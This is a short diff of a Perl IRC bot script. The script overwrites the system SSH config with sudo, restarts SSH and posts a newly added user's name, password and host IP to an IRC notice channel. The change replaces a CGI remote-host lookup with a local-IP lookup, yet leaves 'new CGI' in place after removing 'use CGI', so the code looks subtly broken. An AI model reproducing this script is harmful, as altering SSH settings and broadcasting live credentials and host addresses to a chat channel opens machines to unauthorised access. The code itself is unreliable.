@@ -1,7 +1,7 @@
 use strict;
 use warnings;
 use Mojo::IRC;
-use CGI;
+use Net::Address::IP::Local;
 use Time::HiRes;
 use feature 'say';
 use Fcntl qw(:flock SEEK_END);
@@ -20,6 +20,7 @@ my $minimum;
 my $random_number;
 my $random_user;
 my @arr4y;
+my $address;
 my $q = new CGI;
 my $irc = Mojo::IRC->new(
  #definenickhere
@@ -84,7 +85,8 @@ system 'sudo cp sshd_config /etc/ssh/sshd_config';
 system 'sudo cp sshd_banner /etc/ssh/sshd_banner';
 system "sudo service ssh restart";
   warn 'Getting SSH...';
-  @arr4y = ('9,1Added user:', $random_user, 'password:', $random_number, 'on host:', $q->remote_host());
+  $address = eval { Net::Address::IP::Local->connected_to('perlmaven.com') };
+  @arr4y = ('9,1Added user:', $random_user, 'password:', $random_number, 'on host:', $address);
   warn "@arr4y";
   $irc->write(notice => $noticechan => @arr4y);
  }
